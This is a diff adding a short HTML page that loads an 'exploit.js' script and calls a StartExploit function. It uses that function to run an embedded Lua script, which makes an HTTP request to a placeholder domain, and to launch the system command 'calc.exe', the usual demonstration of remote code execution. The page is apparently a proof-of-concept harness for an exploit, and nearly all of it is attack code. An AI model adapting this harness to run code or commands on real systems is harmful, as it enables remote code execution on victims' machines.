@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<head>
+
+</head>
+<body>
+    <script src="exploit.js"></script>
+    <script>
+        
+        // Execute Lua script
+        let luaScript = `
+        local http = libs.http;
+	    http.get("https://yourdomain.com/", function (err, resp) 
+		    print(err);
+		    print(resp);
+	    end);`
+        StartExploit("script", luaScript)
+        
+        // Execute system commands
+        StartExploit("command", "calc.exe");
+        
+    </script>
+</body>
